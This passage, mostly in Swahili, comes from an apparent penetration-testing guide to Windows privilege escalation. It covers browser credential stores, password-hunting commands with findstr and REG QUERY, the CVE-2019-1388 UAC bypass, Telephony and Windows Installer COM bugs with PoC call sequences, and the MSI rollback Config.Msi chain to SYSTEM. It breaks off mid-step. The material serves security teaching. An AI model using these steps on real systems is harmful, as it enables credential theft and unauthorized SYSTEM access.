Pia angalia historia, alamisho na vipendwa vya vivinjari ili kuona kama **nywila zimehifadhiwa** humo.

Kwa wasifu wa kawaida wa **Default** wa Edge wa mtumiaji wa sasa, `Login Data` iko kwenye `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, huku `Local State` ikiwa kwenye saraka yake kuu ya `User Data`. [Microsoft inaeleza eneo chaguomsingi la wasifu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); wasifu mwingine au sera ya `UserDataDir` inaweza kubadilisha eneo hilo. Kuwepo kwa faili ni kidokezo tu cha mahali pa kuhifadhi hati za kuingia: thibitisha kwamba faili zinaweza kusomeka, kwamba muktadha wa DPAPI wa mtumiaji husika au nyenzo nyingine za ufunguo zilizoidhinishwa zinapatikana, na kwamba akaunti inayohusishwa na login iliyohifadhiwa ina haki za juu zaidi. Kuhesabu njia pekee hakuhitaji kufungua hifadhidata au kuchapisha nywila zilizofumbuliwa.

Kwa Firefox, [Mozilla inaeleza](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kwamba `key4.db` na `logins.json` za wasifu ni faili zinazolingana za ufunguo na login zilizosimbwa kwa njia fiche. Kuwepo kwake ni kidokezo tu: angalia kama faili zote mbili zinaweza kusomeka, kama kuna maingizo yaliyohifadhiwa, na kama Primary Password inalinda ufunguo kabla ya kuhitimisha kuwa hati za kuingia zinaweza kutumika. Ikiwa hati ya kuingia iliyorejeshwa inahusishwa na akaunti ya domain, kagua kando haki halisi za akaunti hiyo za kudhibiti makundi na haki za kundi za [kusoma au kufumbua nywila za LAPS](../active-directory-methodology/laps.md); mabaki ya kivinjari pekee hayathibitishi njia ya kupata haki za msimamizi.

Zana za kutoa nywila kutoka kwenye vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha **mawasiliano** kati ya vipengele vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kupitia class ID (CLSID)**, na kila kipengele hutoa utendaji kupitia kiolesura kimoja au zaidi, vinavyotambuliwa kupitia interface ID (IID).

Class na interface za COM hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSID za registry hii, unaweza kupata registry tanzu **InProcServer32** yenye **thamani chaguomsingi** inayoelekeza kwenye **DLL**, na thamani inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya vivinjari - COM DLL Overwriting: Ndani ya CLSID za registry hii, unaweza kupata registry tanzu InProcServer32 yenye thamani chaguomsingi inayoelekeza kwenye DLL, na thamani...](<../../images/image (729).png>)

Kimsingi, ukiweza **kubadilisha DLL yoyote** itakayotekelezwa, unaweza **kupandisha haki** ikiwa DLL hiyo itatekelezwa na mtumiaji mwingine.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama njia ya kudumisha uwepo, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Kutafuta Nywila kwa Jumla kwenye Faili na Registry**

**Tafuta yaliyomo kwenye faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili lenye jina fulani**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta majina ya funguo na nywila kwenye registry**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoitengeneza ili **kutekeleza kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya mashine ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zilizo na nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kupata nywila kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **nywila** za zana kadhaa zinazohifadhi data hii katika maandishi ya kawaida (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria kwamba **mchakato unaoendeshwa kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) wenye **ufikiaji kamili**. Mchakato huohuo **pia huunda mchakato mpya** (`CreateProcess()`) **wenye privileges za chini, lakini unaorithi handles zote zilizo wazi za mchakato mkuu**.\
Kisha, ikiwa una **ufikiaji kamili kwa mchakato wenye privileges za chini**, unaweza kuchukua **handle iliyo wazi ya mchakato wenye privileges za juu ulioundwa** kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia vulnerability hii**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili jingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia vibaya handles nyingine zilizo wazi za processes na threads zinazorithiwa zikiwa na viwango tofauti vya ruhusa (si ufikiaji kamili pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za shared memory, zinazoitwa **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya processes.

Windows ina kipengele kinachoitwa **Named Pipes**, kinachowaruhusu processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo majukumu hufafanuliwa kama **named pipe server** na **named pipe client**.

Data inapotumwa kupitia pipe na **client**, **server** iliyosanidi pipe inaweza **kujifanya kuwa** **client**, ikiwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **mchakato wenye privileges za juu** unaowasiliana kupitia pipe unayoweza kuiga kunakupa fursa ya **kupata privileges za juu zaidi** kwa kuchukua utambulisho wa mchakato huo unapotumia pipe uliyoanzisha. Kwa maelekezo ya kutekeleza shambulio hili, miongozo muhimu inapatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, zana ifuatayo inaruhusu **kufuatilia mawasiliano ya named pipe kwa kutumia zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) katika hali ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Client wa mbali aliye-authenticate anaweza kutumia vibaya njia ya matukio ya async inayotegemea mailslot ili kubadilisha `ClientAttach` kuwa **uandishi wa byte 4** kwenye faili yoyote iliyopo ambayo `NETWORK SERVICE` inaweza kuiandikia, kisha kupata haki za msimamizi wa Telephony na kupakia DLL yoyote kama huduma. Mtiririko kamili:

- Tumia `ClientAttach` huku `pszDomainUser` ikiwa imewekwa kuwa njia iliyopo inayoweza kuandikwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa uandishi wa matukio ya async.
- Kila tukio huandika `InitContext` inayodhibitiwa na mshambulizi kutoka `Initialize` kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata kupitia `GetAsyncEvents` (`Req_Func 0`), kisha iondoe usajili/zima ili kurudia uandishi kwa namna inayotabirika.
- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` ukiweka njia ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Viungo vya Markdown vinavyoweza kubofya na vinavyopelekwa kwa `ShellExecuteExW` vinaweza kuanzisha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambulizi kama mtumiaji wa sasa. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Unapopata shell kama mtumiaji, huenda kukawa na scheduled tasks au processes nyingine zinazoendeshwa ambazo **hupitisha credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na ile iliyotangulia, kisha kutoa tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba nywila kutoka kwenye michakato

## Kutoka kwa mtumiaji mwenye privilege ndogo hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa unaweza kufikia kiolesura cha picha (kupitia console au RDP) na UAC imewashwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na privilege.

Hii hurahisisha kuongeza privilege na kukwepa UAC kwa wakati mmoja kwa kutumia vulnerability ileile. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato imetiwa sahihi na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii ifuatayo:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili kutumia udhaifu huu, ni muhimu kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na maelezo yote yanayohitajika kwenye repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma haya ili **kujifunza kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma haya ili kujifunza kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kuelekeza Junction za Saraka ya Upakiaji kwenye Root Inayohudumiwa

Programu inaweza kuunda saraka ndogo ya upakiaji inayoweza kutabirika, kuandika jina la faili lililotolewa na mtumiaji ndani yake, kisha kuchakata faili hilo. Ikiwa mtumiaji mwenye haki za chini anaweza kufuta na kubadilisha saraka hiyo ndogo kwa NTFS junction kabla ya uandishi wa upande wa seva, uandishi unaweza kufuata junction hadi kwenye saraka inayohudumiwa na seva ya wavuti. Script iliyowekwa hapo inaweza kuendeshwa kwa utambulisho wa huduma ya wavuti ikiwa seva inaendesha aina hiyo ya faili. Huu ni mpaka wa uandishi holela unaotegemea programu mahususi; saraka ya upakiaji inayoweza kuandikiwa au junction iliyopo peke yake haithibitishi hilo.

Kagua uundaji halisi wa njia na muda wake katika upload handler, haki za mtumiaji za kufuta/kuunda saraka hiyo ndogo, ACL zinazotumika kwenye eneo lengwa, iwapo mchakataji hufuata reparse points, na iwapo seva ya wavuti huendesha faili katika eneo hilo lengwa. Thibitisha kando utambulisho wa michakato ya mchakataji na seva ya wavuti. Ukaguzi usioingilia mfumo unaweza kuonyesha ACL za saraka na metadata ya reparse, lakini hauwezi kuthibitisha tabia ya handler au ubadilishaji wa junction wa baadaye. Ikiwa utekelezaji utafanyika kwa akaunti ya huduma, kagua **token halisi ya mchakato** kabla ya kuzingatia njia nyingine ya token-privilege.

## Usafishaji wa task iliyopangwa yenye upendeleo, unaochochewa na WNF

Task iliyopangwa inayokataa kuendeshwa mwenyewe bado inaweza kuwa na kichocheo kinachoweza kutumiwa na mtumiaji asiye na upendeleo. Unapokagua task yenye upendeleo, hamisha XML yake na ukague **vichocheo vyote** pamoja na DACL ya task, principal na action. Hasa, `WnfStateChangeTrigger` hutaja hali ya Windows Notification Facility (WNF); ikiwa hali hiyo inayoweza kulindwa inaruhusu mtumiaji wa sasa kuchapisha sasisho, mtumiaji anaweza kuanzisha task kwa njia isiyo ya moja kwa moja kwa kutumia utambulisho uliosanidiwa, licha ya `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Kwa mfano, task ya Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` iliendeshwa kama SYSTEM, ilikubali masasisho ya hali ya WNF `7508BCA32C079E41` kutoka kwa mtumiaji wa kawaida, kisha ikakagua `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` hata wakati Recall ilikuwa imezimwa.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Ili kujaribu kama inafikika, pata `ZwUpdateWnfStateData` kutoka `ntdll.dll`, tuma sasisho tupu kwa jina la state lenye baiti nane, kisha linganisha hali ya marejesho na data ya mara ya mwisho task ilipoendeshwa au shughuli za Procmon. Probe ifuatayo iliyopunguzwa hutumia mfuatano wa baiti kutoka kwenye mfano wa Recall task; badilisha baiti hizo kwa zile zilizotolewa kwa task inayojaribiwa.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Kubadilisha usafishaji unaojirudia kuwa ufutaji wenye ruhusa za juu

Primitive muhimu si kichochezi pekee, bali ni utaratibu wa usafishaji wenye ruhusa za juu unaokubali saraka inayodhibitiwa na mshambuliaji. Fuatilia operesheni kuanzia uorodheshaji hadi mabadiliko ya mwisho: ugunduzi wa wasifu/vikao, watoto waliochaguliwa kwa wildcard, `SHCreateItemFromParsingName`, na `IFileOperation::DeleteItem` ni viashiria madhubuti kwamba njia ya jina iliyokaguliwa awali itapitiwa tena kwa kujirudia baadaye. Ikiwa vizazi havifunguliwi kulingana na handle za saraka zinazoaminika na kuthibitishwa kabla ya kufutwa, mshambuliaji anaweza kubadilisha uelekezaji kati ya uorodheshaji na matumizi.<sup>[[43]](#references)</sup>

Oanisha kichochezi cha WNF na [ubadilishaji wa oplock, junction na Object Manager symlink](#from-folder-contents-delete-to-system-eop) ulioelezwa hapa chini: oplock inasimamisha cleaner baada ya kuchagua mtoto halali, huku ancestor inayoweza kuandikwa ikibadilishwa ili ufutaji wa upendeleo wa juu unapoendelea tena uelekezwe kupitia `\RPC Control` hadi kwenye lengo lililolindwa. Katika mnyororo wa Recall, hili lilisababisha ufutaji wa `C:\Config.Msi` na SYSTEM, uliohitajika na mbinu ya MSI rollback iliyoandikwa.<sup>[[31]](#references)[[43]](#references)</sup>

### Vizazi vilivyo ndani zaidi hupita marekebisho ya juu juu ya reparse-point

Kuthibitisha mzizi unaodhibitiwa na mshambuliaji na mtoto wake wa karibu pekee hakulindi ufutaji unaojirudia unaotumia njia za majina. Acha vitu hivyo vilivyokaguliwa vibaki halali, kisha hamishia ubadilishaji wa junction/oplock kwenye mtoto mwingine aliye chini yake; hatimaye `IFileOperation::DeleteItem` hufikia kizazi ambacho hakijathibitishwa na kufuata lengo lake jipya. CVE-2026-20941 ilisababishwa hasa na aina hii ya marekebisho yasiyokamilika baada ya kiraka cha kwanza cha Recall kuthibitisha `UKP` na saraka yenye umbo la GUID, lakini kikaacha operesheni ya zamani ya ufutaji unaojirudia.<sup>[[43]](#references)</sup>

Muundo salama ni kufungua **kila kizazi** kulingana na handle ya saraka inayoaminika tayari, kupata na kuthibitisha njia/kitu cha mwisho kilichotatuliwa, kisha kutumia disposition ya ufutaji kwenye handle hiyo iliyothibitishwa. Usithibitishe kiambishi awali kisha urudi kwenye ufutaji unaojirudia unaotumia njia za majina. Wakati wa kukagua kiraka, kagua pia miundo kwenye sehemu halisi ya mwito: katika kesi hii, ukaguzi wa runtime wa `OBJECT_ATTRIBUTES` kwenye `NtCreateFile` ulionyesha `RootDirectory` isiyo null na jina la jamaa `{GUID}\\secure_file.lock`, na hivyo kukanusha matokeo ya decompiler yaliyopotosha yaliyodokeza primitive ya pili ya `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Kutoka kwa Kufuta/Kuhamisha/Kubadilisha Jina kwa Folder Yoyote hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) ikiwa na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Kimsingi, shambulio hili linatumia vibaya kipengele cha rollback cha Windows Installer ili kubadilisha faili halali kwa faili hasidi wakati wa mchakato wa kuondoa programu. Kwa hili, mshambuliaji anahitaji kuunda **kisakinishi cha MSI hasidi** kitakachotumiwa kuteka nyara folda ya `C:\Config.Msi`; baadaye Windows Installer itaitumia kuhifadhi faili za rollback wakati wa kuondoa vifurushi vingine vya MSI, ambapo faili za rollback zitakuwa zimebadilishwa ili ziwe na payload hasidi.

### Uingizaji wa njia ya usafishaji wa Windows Installer COM (CVE-2025-27727)

Mteja mwenye ruhusa za chini anaweza kufikia huduma ya SYSTEM `msiexec.exe` kupitia kitu cha COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Uhandisi wa kinyume ulibainisha miito husika ya `IMsiServer` kuwa `MsiBeginTransactionW` kwenye nafasi ya vtable `0xA0`, `SetEEUIDirectoryAndFilter` kwenye `0xC8`, na `CleanupTempPackages` kwenye `0x50`. Majina na nafasi hizi zimepatikana kwa uhandisi wa kinyume na zinaweza kutofautiana kati ya builds.<sup>[[41]](#references)</sup>

Kwa mtu ambaye si msimamizi, `SetEEUIDirectoryAndFilter` humwigiza mpigaji wakati tu inapofungua njia iliyotolewa kwa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, na `FILE_FLAG_OPEN_REPARSE_POINT`. Hili linathibitisha kwamba mpigaji anaweza kufuta saraka na huepusha kufuata reparse point, lakini **haliunganishi** object ya faili iliyokaguliwa na usafishaji wa baadaye wala kuthibitisha kwamba Windows Installer ndiyo iliyoiumba.<sup>[[41]](#references)</sup>

Baada ya `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` hupanga njia kama folda bila kujali hoja ya kichujio ya mpigaji. Huduma huandika thamani yenye jina `REG_DWORD` chini ya `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: jina la thamani ni njia inayodhibitiwa na mpigaji na data `0x00000002` ni bendera ya folda. Kisha `CleanupTempPackages(NULL, FALSE)` huanza usafishaji moja kwa moja. Worker yake yenye ruhusa za juu huorodhesha thamani za registry na kupitisha maingizo ya folda kwa `FDeleteFolder` inayofuta kwa kujirudia bila kukagua chanzo cha njia. Ikiwa uondoaji wa kawaida utashindikana, msimbo pia huita `LockdownPath`, huondoa sifa za faili na kujaribu tena.<sup>[[41]](#references)</sup>

Mfuatano wa chini kabisa wa miito uliopatikana kutoka `msi.dll` ni:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive muhimu ni kutumia tena njia badala ya kuelekeza upya junction. Sajili `C:\Config.Msi` iliyoundwa na mshambuliaji, iondoe, kisha uruhusu Windows Installer iunde tena jina hilo la njia likiwa na data ya rollback iliyolindwa. Usafishaji huamini jina la zamani la `TempPackages` na kufuta saraka mpya kama SYSTEM. Hii hukwepa mpaka uliokusudiwa na `FILE_FLAG_OPEN_REPARSE_POINT` pamoja na upunguzaji wa hatari wa kuamini uelekezaji upya, kwa sababu hakuna reparse point inayohitajika.<sup>[[41]](#references)</sup>

Primitive hii ya kufuta inafaa katika mnyororo wa rollback ulio hapa chini: hifadhi rekodi tofauti ya `Installer\Folders`, futa `C:\Config.Msi` iliyolindwa, iunde tena ikiwa na NULL DACL, na uhifadhi handle iliyopewa `WRITE_DAC` kabla Installer haijaimarisha DACL. Handle iliyofunguliwa awali inaweza kurejesha DACL iliyoruhusu ufikiaji kwa kutumia `NtSetSecurityObject`, kisha `.rbs` iliyozalishwa inaweza kubadilishwa kabla rollback haijaendelea.<sup>[[41]](#references)</sup>

Microsoft ilirekebisha njia hii kwa kuzuia `CMsiTransaction::SetEEUIDirectoryAndFilter` isiite `ScheduleFileOrFolderDelete` kipengele kipya cha udhibiti kinapowezeshwa. COM call bado inaweza kurudisha mafanikio, lakini haiweki tena njia inayodhibitiwa na mshambuliaji kwenye `TempPackages`. Sakinisha masasisho ya usalama ya Windows ya Aprili 2025 badala ya kutumia mafanikio ya kurudi kwa method kama jaribio la kiraka.<sup>[[41]](#references)[[42]](#references)</sup>

Muhtasari wa mbinu hii ni kama ifuatavyo:

1. **Hatua ya 1 – Kuandaa Hijack (acha `C:\Config.Msi` tupu)**

- Hatua ya 1: Sakinisha MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) kwenye folda inayoweza kuandikwa (`TARGETDIR`).
    - Weka alama ya **"UAC Compliant"** kwenye installer, ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ikiwa wazi kwa faili baada ya usakinishaji.

- Hatua ya 2: Anza Uninstall
    - Ondoa `.msi` hiyohiyo.
    - Mchakato wa uninstall huanza kuhamisha faili hadi `C:\Config.Msi` na kuzibadilisha majina kuwa faili za `.rbf` (hifadhi rudufu za rollback).
    - **Kagua handle ya faili iliyo wazi** kwa kutumia `GetFinalPathNameByHandle` ili kugundua faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Usawazishaji Maalum
    - `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutoa ishara baada ya `.rbf` kuandikwa.
        - Kisha **husubiri** tukio lingine kabla ya kuendelea na uninstall.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Baada ya kupokea ishara, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia isifutwe**.
    - Kisha **tuma ishara ya kurudisha** ili uninstall ikamilike.
    - Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta yaliyomo yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambuliaji) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` ni tupu**, tayari kutekwa.

> Kwa wakati huu, **anzisha udhaifu wa kufuta folda kiholela kwa kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Badilisha Hati za Rollback kwa Zenye Madhara**

- Hatua ya 6: Unda Tena `C:\Config.Msi` ikiwa na ACL dhaifu
    - Unda tena folda ya `C:\Config.Msi` mwenyewe.
    - Weka **DACL dhaifu** (kwa mfano, Everyone:F), na **acha handle wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Usakinishaji Mwingine
    - Sakinisha `.msi` tena, ukiweka:
        - `TARGETDIR`: Eneo linaloweza kuandikwa.
        - `ERROROUT`: Kigezo kinachosababisha hitilafu ya lazima.
    - Usakinishaji huu utatumika kuanzisha **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya ionekane.
    - Rekodi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutoa ishara ya tukio baada ya `.rbs` kuundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL dhaifu
    - Baada ya kupokea tukio la `.rbs created`:
        - Windows Installer **huweka tena ACL imara** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACL dhaifu**.

> ACL **hutekelezwa tu wakati handle inafunguliwa**, kwa hiyo bado unaweza kuandika kwenye folda.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` na **hati bandia ya rollback** inayoiambia Windows:
        - Irejeshe faili yako ya `.rbf` (DLL yenye madhara) kwenye **eneo lenye upendeleo** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` bandia iliyo na **DLL ya payload yenye madhara ya kiwango cha SYSTEM**.

- Hatua ya 12: Anzisha Rollback
    - Tuma ishara ya tukio la usawazishaji ili installer iendelee.
    - **Custom action ya aina ya 19 (`ErrorOut`)** imewekwa ili **kufeli usakinishaji kimakusudi** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Husakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako yenye madhara.
        - Hunakili DLL yako ya `.rbf` hadi eneo lengwa.
    - Sasa una **DLL yako yenye madhara katika njia inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza Msimbo wa SYSTEM
    - Endesha **binary inayoaminika inayopandisha ruhusa kiotomatiki** (kwa mfano, `osk.exe`) inayopakia DLL uliyoiteka.
    - **Imekamilika**: Msimbo wako unatekelezwa **kama SYSTEM**.


### Kutoka Kufuta/Kuhamisha/Kubadilisha Jina la Faili Kiholela hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotangulia) hudhani unaweza kufuta **folda nzima** (kwa mfano, `C:\Config.Msi`). Lakini vipi ikiwa udhaifu wako unaruhusu **kufuta faili kiholela** pekee?

Unaweza kutumia **mambo ya ndani ya NTFS**: kila folda ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream hii huhifadhi **metadata ya index** ya folda.

Kwa hiyo, ukifuta stream ya `::$INDEX_ALLOCATION` ya folda, NTFS **huondoa folda nzima** kwenye filesystem.

Unaweza kufanya hivi kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Vipi ikiwa primitive yako hairuhusu kufuta file/folder yoyote unayotaka, lakini **inaruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi folder ya chambo na file
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husimamisha utekelezaji** mchakato wenye privileges unapojaribu kufuta `file1.txt`.

```c
